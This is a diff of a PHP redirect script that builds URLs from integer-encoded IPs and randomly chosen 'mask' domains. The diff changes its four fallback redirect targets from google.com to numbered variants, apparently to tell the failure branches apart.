@@ -12,7 +12,7 @@ function shutdown(){
         $redirect_url = utf8_decode($redirect_url);
         header("Location: " . $redirect_url, true, 302);
     }else{
-        header("Location: https://www.google.com", true, 302);
+        header("Location: https://www.google.com.1", true, 302);
     }
 }
 
@@ -52,7 +52,7 @@ if(!is_empty(apcu_fetch('data')) && !is_empty(apcu_fetch('meta_data'))){
     if(array_key_exists($master_domain, $meta_data)){
         $client_id = $meta_data[$master_domain];
     }else{
-        $redirect_url = 'https://www.google.com';
+        $redirect_url = 'https://www.google.com.2';
         exit;
     }
 
@@ -68,7 +68,7 @@ if(!is_empty(apcu_fetch('data')) && !is_empty(apcu_fetch('meta_data'))){
         }else if(array_key_exists('fallback', $mask_domains)){
             $pair_domain = $mask_domains['fallback'][array_rand($mask_domains['fallback'])];
         }else{
-            $redirect_url = 'https://www.google.com';
+            $redirect_url = 'https://www.google.com.3';
             exit;
         }
     }
@@ -76,6 +76,6 @@ if(!is_empty(apcu_fetch('data')) && !is_empty(apcu_fetch('meta_data'))){
     // $redirect_url = 'http://' . $sub_domain . '.' .  ip2long($client_data['lb_domains'][$master_domain]) . "." . $pair_domain . $_SERVER['REQUEST_URI'];
     $redirect_url = 'http://' . ip2long($client_data['lb_domains'][$master_domain]) . "." . $pair_domain . $_SERVER['REQUEST_URI'];
 }else{
-    $redirect_url = 'https://www.google.com';
+    $redirect_url = 'https://www.google.com.4';
     exit;
 }
